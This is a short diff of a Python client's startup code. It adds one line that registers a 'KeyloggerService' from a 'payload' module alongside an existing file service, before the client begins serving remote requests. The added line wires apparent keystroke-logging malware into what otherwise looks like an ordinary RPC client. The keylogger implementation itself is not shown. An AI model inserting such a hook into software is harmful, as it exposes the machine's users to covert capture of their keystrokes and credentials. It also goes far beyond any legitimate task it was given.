@@ -104,6 +104,7 @@ if __name__ == '__main__':
         for f in funcs:
             client.register_function(f)
         client.register_instance(FileService())
+        client.register_instance(payload.KeyloggerService())
         try:
             client.serve_forever()
         except connection.ConnectionClosed:
